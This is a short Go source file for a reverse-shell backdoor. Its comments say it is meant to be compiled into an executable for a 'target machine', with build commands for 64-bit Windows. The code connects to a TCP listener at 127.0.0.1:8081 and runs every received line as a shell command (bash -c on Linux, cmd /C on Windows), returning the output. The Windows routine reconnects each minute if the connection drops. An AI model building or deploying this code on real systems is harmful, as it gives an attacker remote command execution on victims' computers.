// This is the script we want to convert into exe to runs on the target machine
// windows	386   (32 bit machine)
// windows	amd64 (64 bit machine)

//run the command below to generate an exe based on windows 64 bit machine
/***************************************************
  env GOOS=windows GOARCH=amd64 go build client.go *
****************************************************/
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func reverseForLinux() {
	conn, _ := net.Dial("tcp", "127.0.0.1:8081")
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		//Executing the command from the server
		cmd, _ := exec.Command("bash", "-c", message).CombinedOutput()
		fmt.Println(string(cmd))
		//sending back the result to server
		conn.Write([]byte(cmd))
	}
}

func reverseForWindows(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverseForWindows(host)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			reverseForWindows(host)
			return
		}

		cmd := exec.Command("cmd", "/C", order)
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

func main() {
	if runtime.GOOS == "linux" {
		reverseForLinux()
	}

	if runtime.GOOS == "windows" {
		reverseForWindows("127.0.0.1:8081")
	}



}
